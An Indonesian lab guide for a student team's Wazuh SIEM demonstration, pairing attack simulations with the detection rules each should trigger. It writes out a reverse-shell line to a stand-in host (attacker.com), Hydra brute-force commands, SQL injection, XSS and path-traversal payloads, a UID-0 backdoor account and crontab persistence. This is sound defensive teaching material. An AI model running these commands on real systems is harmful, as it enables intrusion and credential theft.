# Simulasi Serangan & Deteksi

Dokumen ini berisi skenario simulasi serangan yang akan dijalankan pada masing-masing agent, beserta cara memverifikasi deteksi di Wazuh Dashboard.

> **PERINGATAN**: Semua simulasi ini dilakukan HANYA pada sistem milik sendiri dalam lingkungan lab. JANGAN jalankan pada sistem yang bukan milik kamu.

---

## Overview Skenario Serangan

| No | Skenario | Agent | Rule ID | Level |
|----|----------|-------|---------|-------|
| 1 | SSH Brute Force | Agent 1 | 5710, 5712 | 10-12 |
| 2 | SQL Injection & XSS (Web Attack) | Agent 2 | 31103-31110 | 6-12 |
| 3 | File Integrity Monitoring (FIM) | Agent 3 | 550-554 | 5-7 |
| 4 | Rootkit Detection | Agent 3 | 510-514 | 7-12 |
| 5 | Privilege Escalation (sudo abuse) | Agent 1 | 5401-5404 | 5-10 |
| 6 | DDoS Attack | Agent 3 | 1002, 20101 | 6-10 |

---

## Skenario 1: SSH Brute Force Attack

### Tujuan
Mensimulasikan percobaan login SSH berkali-kali dengan password salah. Wazuh akan mendeteksi pola ini sebagai brute force attack.

### Persiapan di Agent
```bash
# Pastikan SSH server terinstall di agent
sudo apt install -y openssh-server
sudo systemctl start ssh
sudo systemctl enable ssh
```

### Cara Simulasi

#### Opsi A: Manual (dari laptop lain atau dari VPS)

```bash
# Jalankan dari komputer lain atau VPS, bukan dari agent itu sendiri
# Percobaan login SSH dengan password salah berulang-ulang

# Ganti <IP_AGENT> dengan localhost (jika menyerang laptop sendiri)
for i in $(seq 1 20); do
    echo "Attempt $i"
    sshpass -p 'wrongpassword' ssh -o StrictHostKeyChecking=no fakeuser@localhost 2>/dev/null
    sleep 1
done
```

#### Opsi B: Menggunakan Hydra (Tool Brute Force)

```bash
# Install hydra (di komputer penyerang, BUKAN di agent)
sudo apt install -y hydra

# Buat wordlist password
echo -e "password123\nadmin\n123456\nletmein\nwrongpass\ntest123\nhacked\nqwerty\nabc123\npassword1" > passwords.txt

# Jalankan brute force
hydra -l admin -P passwords.txt localhost ssh -t 4 -V
```

#### Opsi C: Simulasi lokal (tanpa tool tambahan)

```bash
# Di agent itu sendiri, simulate failed auth langsung ke log
# Ini cara paling simpel untuk demo

for i in $(seq 1 15); do
    logger -p auth.warning "Failed password for invalid user hacker from 192.168.1.100 port 22 ssh2"
    sleep 0.5
done

# Tambahan: SSH ke diri sendiri dengan password salah
for i in $(seq 1 10); do
    sshpass -p 'wrong' ssh -o StrictHostKeyChecking=no nonexistent@localhost 2>/dev/null
    sleep 1
done
```

### Apa yang Terdeteksi di Wazuh

| Alert | Rule ID | Deskripsi |
|-------|---------|-----------|
| Authentication failure | 5710 | Attempt to login using a non-existent user |
| Multiple authentication failures | 5712 | Multiple failed authentication attempts |
| Brute force attack | 5763 | SSH brute force attack detected (10+ failures in 120 sec) |

### Cara Cek di Dashboard
1. Login Dashboard → **Security Events**
2. Filter: `rule.id: 5710 OR rule.id: 5712 OR rule.id: 5763`
3. Atau klik agent yang bersangkutan → lihat **Events** tab
4. Screenshot hasilnya untuk laporan

---

## Skenario 2: Web Attack (SQL Injection & XSS)

### Tujuan
Mensimulasikan serangan web (SQLi dan XSS) terhadap web server. Wazuh mendeteksi pola serangan ini dari log Apache/Nginx.

### Persiapan di Agent

```bash
# Install Apache web server
sudo apt install -y apache2

# Start Apache
sudo systemctl start apache2
sudo systemctl enable apache2

# Verifikasi berjalan
curl http://localhost
```

Pastikan di `ossec.conf` agent sudah ada log collection untuk Apache:
```xml
<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/access.log</location>
</localfile>
<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/error.log</location>
</localfile>
```

Restart agent: `sudo systemctl restart wazuh-agent`

### Cara Simulasi

#### SQL Injection Attacks

```bash
# Simulasi SQL injection via curl
# Jalankan dari agent itu sendiri (localhost)

# Basic SQL injection
curl "http://localhost/index.html?id=1' OR '1'='1"
curl "http://localhost/login?user=admin'--"
curl "http://localhost/search?q=1 UNION SELECT * FROM users--"
curl "http://localhost/page?id=1; DROP TABLE users;--"

# More SQL injection patterns
curl "http://localhost/product?id=1' AND 1=1--"
curl "http://localhost/api?param=' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--"
curl "http://localhost/page?file=../../etc/passwd"
```

#### XSS (Cross-Site Scripting) Attacks

```bash
# Reflected XSS
curl "http://localhost/search?q=<script>alert('XSS')</script>"
curl "http://localhost/page?name=<img src=x onerror=alert(1)>"
curl "http://localhost/comment?text=<svg/onload=alert('hacked')>"

# Stored XSS patterns
curl "http://localhost/input?data=<iframe src='javascript:alert(1)'>"
curl "http://localhost/form?field=<body onload=alert('XSS')>"
```

#### Directory Traversal

```bash
# Path traversal attacks
curl "http://localhost/page?file=../../../etc/passwd"
curl "http://localhost/download?path=....//....//etc/shadow"
curl "http://localhost/include?page=....\\....\\windows\\system32\\config\\sam"
```

#### Menggunakan Nikto (Web Scanner)

```bash
# Install nikto
sudo apt install -y nikto

# Scan web server agent
nikto -h http://localhost -o nikto-results.txt

# Ini akan menghasilkan banyak request mencurigakan yang terdeteksi Wazuh
```

### Apa yang Terdeteksi di Wazuh

| Alert | Rule ID | Deskripsi |
|-------|---------|-----------|
| SQL Injection attempt | 31103 | SQL injection attempt detected |
| XSS attempt | 31104 | Cross-site scripting (XSS) attempt |
| Directory traversal | 31105 | Path traversal attempt |
| Web scan detected | 31101 | Web vulnerability scanner detected |
| Common web attack | 31110 | Multiple web attack patterns |

### Cara Cek di Dashboard
1. **Security Events** → filter by agent
2. Filter: `rule.groups: web` atau `rule.groups: attack`
3. Klik event untuk lihat detail (source IP, URL pattern, dll)

---

## Skenario 3: File Integrity Monitoring (FIM)

### Tujuan
Mendemonstrasikan deteksi perubahan file penting di sistem. Ketika file konfigurasi atau binary diubah, Wazuh langsung mendeteksi.

### Persiapan di Agent

Pastikan FIM aktif di `ossec.conf`:

```xml
<syscheck>
  <disabled>no</disabled>
  <frequency>60</frequency>  <!-- Scan setiap 60 detik untuk demo -->
  <scan_on_start>yes</scan_on_start>

  <!-- Direktori yang dimonitor -->
  <directories realtime="yes" check_all="yes" report_changes="yes">/etc</directories>
  <directories realtime="yes" check_all="yes" report_changes="yes">/tmp/fim-test</directories>
  <directories realtime="yes" check_all="yes" report_changes="yes">/var/www</directories>
</syscheck>
```

Restart agent: `sudo systemctl restart wazuh-agent`

### Cara Simulasi

```bash
# Buat direktori test
sudo mkdir -p /tmp/fim-test

# === Simulasi 1: File Creation ===
echo "original content" | sudo tee /tmp/fim-test/secret-config.txt
echo "password=admin123" | sudo tee /tmp/fim-test/credentials.txt

# Tunggu 1-2 menit sampai initial scan selesai

# === Simulasi 2: File Modification ===
echo "MODIFIED by attacker!" | sudo tee -a /tmp/fim-test/secret-config.txt
echo "password=hacked!" | sudo tee /tmp/fim-test/credentials.txt

# === Simulasi 3: File Deletion ===
sudo rm /tmp/fim-test/credentials.txt

# === Simulasi 4: Permission Change ===
sudo chmod 777 /tmp/fim-test/secret-config.txt
sudo chown nobody:nogroup /tmp/fim-test/secret-config.txt

# === Simulasi 5: Modifikasi file sistem penting ===
# HATI-HATI: backup dulu!
sudo cp /etc/hosts /etc/hosts.bak
echo "10.10.10.10 malicious-site.com" | sudo tee -a /etc/hosts

# Kembalikan ke semula setelah demo
sudo cp /etc/hosts.bak /etc/hosts
```

### Apa yang Terdeteksi di Wazuh

| Alert | Rule ID | Deskripsi |
|-------|---------|-----------|
| File added | 554 | File added to monitored directory |
| File modified | 550 | Integrity checksum changed |
| File deleted | 553 | File deleted from monitored directory |
| Permissions changed | 550 | File permissions were modified |
| Ownership changed | 550 | File ownership was changed |

### Cara Cek di Dashboard
1. **Integrity Monitoring** module (sidebar)
2. Atau **Security Events** → filter: `rule.groups: syscheck`
3. Klik event → lihat detail perubahan (before/after checksum, content diff)

---

## Skenario 4: Rootkit & Malware Detection

### Tujuan
Mensimulasikan indikator keberadaan rootkit/malware di sistem.

### Cara Simulasi

```bash
# === Simulasi 1: Hidden file (common rootkit indicator) ===
sudo touch /dev/.hidden_backdoor
sudo touch /usr/bin/.secret_tool

# === Simulasi 2: Suspicious file di /tmp ===
echo '#!/bin/bash' | sudo tee /tmp/.malware.sh
echo 'nc -e /bin/bash attacker.com 4444' | sudo tee -a /tmp/.malware.sh
sudo chmod +x /tmp/.malware.sh

# === Simulasi 3: Process hiding simulation ===
# Buat proses background yang suspicious
nohup bash -c 'while true; do sleep 60; done' &
echo $! > /tmp/suspicious_pid.txt

# === Simulasi 4: Suspicious network connection ===
# Install netcat jika belum ada
sudo apt install -y netcat-openbsd

# Buat listener (simulasi backdoor)
nc -l -p 4444 &

# === Simulasi 5: Unauthorized user creation ===
sudo useradd -m -s /bin/bash backdoor_user 2>/dev/null
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash superuser 2>/dev/null

# CLEANUP setelah demo:
sudo rm /dev/.hidden_backdoor
sudo rm /usr/bin/.secret_tool
sudo rm /tmp/.malware.sh
sudo userdel backdoor_user 2>/dev/null
sudo userdel superuser 2>/dev/null
kill $(cat /tmp/suspicious_pid.txt) 2>/dev/null
```

### Apa yang Terdeteksi di Wazuh

| Alert | Rule ID | Deskripsi |
|-------|---------|-----------|
| Hidden file found | 510 | Host-based anomaly detection (hidden file/dir) |
| Rootkit indicator | 512 | Rootkit detection: hidden file found in /dev |
| New user created | 5901 | New user account created |
| User with UID 0 | 5903 | Non-root user with UID 0 (potential backdoor) |

---

## Skenario 5: Privilege Escalation & Sudo Abuse

### Tujuan
Mendeteksi percobaan privilege escalation dan penggunaan sudo yang mencurigakan.

### Cara Simulasi

```bash
# === Simulasi 1: Failed sudo attempts ===
# Login sebagai user biasa (bukan root)
su - testuser  # atau user biasa manapun

# Coba sudo berulang kali dengan password salah
sudo ls /root        # masukkan password salah
sudo cat /etc/shadow # masukkan password salah
sudo su -            # masukkan password salah

# === Simulasi 2: su to root failures ===
su - root            # masukkan password salah beberapa kali

# === Simulasi 3: Unauthorized sudo command ===
# Edit sudoers untuk demo (dari root)
# sudo visudo → tambah: testuser ALL=(ALL) /usr/bin/ls
# Kemudian testuser coba jalankan command yang tidak diizinkan
sudo /bin/bash       # akan denied jika tidak di sudoers

# === Simulasi 4: Crontab manipulation ===
# Sebagai user biasa
echo "* * * * * /tmp/.malware.sh" | crontab -
crontab -r  # cleanup
```

### Apa yang Terdeteksi di Wazuh

| Alert | Rule ID | Deskripsi |
|-------|---------|-----------|
| sudo auth failure | 5401 | Unsuccessful sudo command |
| Multiple sudo failures | 5404 | 3+ unsuccessful sudo attempts |
| su failure | 5301 | su session failed |
| Unauthorized sudo | 5403 | Unauthorized user attempted sudo |

---

## Cara Melihat Semua Alert di Dashboard

### 1. Security Events Overview
- Login Dashboard → **Modules** → **Security Events**
- Lihat timeline semua alert
- Filter by agent, rule level, rule group

### 2. Filter Query yang Berguna

```
# Semua alert level tinggi (critical)
rule.level: >= 10

# Alert dari agent tertentu
agent.name: "laptop-andi"

# Brute force alerts
rule.id: 5712 OR rule.id: 5763

# Web attack alerts
rule.groups: "web" OR rule.groups: "attack"

# FIM alerts
rule.groups: "syscheck"

# Semua alert hari ini
@timestamp: [now/d TO now]
```

### 3. Cara Screenshot untuk Laporan
1. Buka module yang relevan
2. Set time range yang sesuai
3. Klik **Generate report** atau screenshot manual
4. Dashboard bisa export ke PDF

---

## Timeline Demo Presentasi (30 menit)

| Waktu | Aktivitas | PIC |
|-------|-----------|-----|
| 0-5 min | Intro arsitektur & login dashboard | Syifa Nurul Alfiah (Manager) |
| 5-10 min | Demo Agent 1: SSH Brute Force | Putri Joselina Silitonga |
| 10-15 min | Demo Agent 2: Web Attack (SQLi/XSS) | Salsa Bil Ulla |
| 15-20 min | Demo Agent 3: FIM & Rootkit | Revalina Erica Permatasari |
| 20-25 min | Review semua alert di Dashboard & Integrasi SOAR + TheHive | Syifa Nurul Alfiah |
| 25-30 min | Q&A & Kesimpulan | Semua |
